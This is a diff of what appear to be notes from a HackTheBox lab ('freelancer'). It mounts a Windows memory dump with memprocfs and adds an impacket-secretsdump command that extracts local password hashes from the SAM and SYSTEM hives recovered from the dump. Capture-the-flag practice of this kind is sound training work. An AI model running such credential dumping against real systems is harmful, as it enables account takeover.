@@ -139,6 +139,9 @@ ____________________________________-
 ┌──(milo㉿Kali2023)-[~/Downloads/memprocf]
 └─$ ./memprocfs -device /home/milo/HTB/MEMORY.DMP -mount /home/milo/HTB/freelancer
 
+┌──(milo㉿Kali2023)-[~]
+└─$ impacket-secretsdump -sam /home/milo/HTB/freelancer/registry/hive_files/0xffffd3067d935000-SAM-MACHINE_SAM.reghive -system /home/milo/HTB/freelancer/registry/hive_files/0xffffd30679c46000-SYSTEM-MACHINE_SYSTEM.reghive local 
+
 
 
 
